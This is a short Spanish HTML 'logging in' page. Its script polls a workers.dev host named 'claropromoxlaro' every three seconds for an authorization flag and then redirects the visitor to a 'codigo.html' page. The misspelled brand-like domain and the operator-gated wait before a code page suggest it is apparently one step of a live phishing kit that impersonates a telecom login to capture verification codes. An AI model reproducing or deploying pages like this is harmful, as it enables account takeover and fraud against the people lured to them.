<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Ingresando...</title>
</head>
<body>
  <h2>Ingresando...</h2>
  <p id="status">Esperando autorización...</p>

  <script>
    const statusEl = document.getElementById("status");
    const checkInterval = 3000; // cada 3 segundos
    const id = localStorage.getItem("authId"); // ID temporal del login

    async function checkAuth() {
      try {
        const res = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${id}`);
        const data = await res.json();

        if (data.autorizado) {
          window.location.href = "codigo.html"; // redirige cuando se autoriza
        } else {
          statusEl.textContent = "Esperando autorización...";
        }
      } catch(err) {
        console.error(err);
        statusEl.textContent = "Error al conectar al servidor.";
      }
    }

    // Polling cada 3 segundos
    setInterval(checkAuth, checkInterval);
  </script>
</body>
</html>
